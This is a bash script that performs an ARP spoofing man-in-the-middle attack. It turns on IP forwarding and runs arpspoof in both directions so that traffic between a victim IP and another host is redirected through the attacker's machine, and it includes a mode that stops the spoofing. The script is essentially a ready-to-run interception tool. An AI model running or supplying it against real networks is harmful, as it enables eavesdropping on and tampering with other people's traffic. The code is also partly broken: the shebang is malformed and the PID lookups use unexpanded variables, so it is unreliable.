#/bin/bash

# 'arpspoof_kali.sh'
# ARP Spoof attack
# Stoenescu Horia

if [ "$#" -ne 3 ]; then
	echo "Usage! ./arpspoof_kali.sh attack/clean ip_victim/pid_proc1 ip_other_host/pid_proc2"
	echo "The IPs are needed only when attack flag is given and the pids when the arp tables need cleanup. The order is attack -> cleanup"
	exit
fi
flag=$1

if [ $flag == "attack" ]; then
	# Verify if IP forwarding is enabled on machine
	# It is needed to redirect traffic through this attacker PC
	ip_victim=$2
	ip_other_host=$3
	echo "Verify if the IP forwarding is enabled on this PC"
	out_ip_fwd=$(cat /proc/sys/net/ipv4/ip_forward)
	if [[ $out_ip_fwd -eq 1 ]]; then
		echo "The IP forwarding is already enabled. There is no need to re-enable it."
	else
		echo '1' > /proc/sys/net/ipv4/ip_forward
		sysctl -p
		echo "The IP forwarding was not previosly enabled and now was successfully enabled on this PC."	
	fi

	# victim <--> Kali
	arpspoof -i eth0 -t $ip_victim $ip_other_host > /dev/null 2>&1 &
	# save the pid of the running process (another one must not exist)
	pid_proc1=$(ps -aux | grep 'arpspoof -i eth0 -t $ip_victim $ip_other_host > /dev/null 2>&1 &' | sed "s/  */ /g" | cut -d " " -f2)
	echo "pid for the first spoof: $pid_proc1"
	 
	# Kali <---> other host
	arpspoof -i eth0 -t $ip_other_host $ip_victim > /dev/null 2>&1 &
	# now save the pid of the second running process
	pid_proc2=$(ps -aux | grep 'arpspoof -i eth0 -t $ip_other_host $ip_victim > /dev/null 2>&1 &' | sed "s/  */ /g" | cut -d " " -f2)
	echo "pid of the second spoof: $pid_proc2"
elif [ $flag == "clean" ]; then
	pid_proc1=$2
	pid_proc2=$3
	echo "Clean the arp tables of the victim and other host"
	sudo kill -2 $pid_proc1
	sudo kill -2 $pid_proc2
	echo "Wait for 5 seconds and the tables on each devices should be cleaned!"
else
	echo "Failure! The flag added as input is not correct"
	echo "Correct ones: attack or clean"
fi

